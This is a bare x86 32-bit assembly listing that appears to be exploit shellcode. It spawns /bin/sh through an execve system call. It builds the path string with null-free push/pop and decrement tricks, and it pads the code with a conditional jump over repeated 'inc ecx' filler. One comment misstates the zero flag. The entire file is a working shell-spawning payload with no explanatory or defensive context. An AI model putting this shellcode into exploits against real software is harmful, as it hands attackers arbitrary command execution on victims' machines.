[bits 32]

	; envp = NULL
	push byte 0x01
	pop edx
	dec edx ; this also sets ZF = 0

	jz short +0x13
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx
	inc ecx

	; filename = "/bin/sh"
	push byte 0x68
	push word 0x7330
	pop ebx
	dec ebx
	push ebx

	push dword 0x6e696230
	pop ebx
	dec ebx
	push ebx

	push esp
	pop ebx

	; argv = { filename, NULL }
	push edx  ; NULL
	push ebx  ; "/bin/sh"
	push esp
	pop ecx

	; syscall execve
	push byte 11
	pop eax
	int 0x80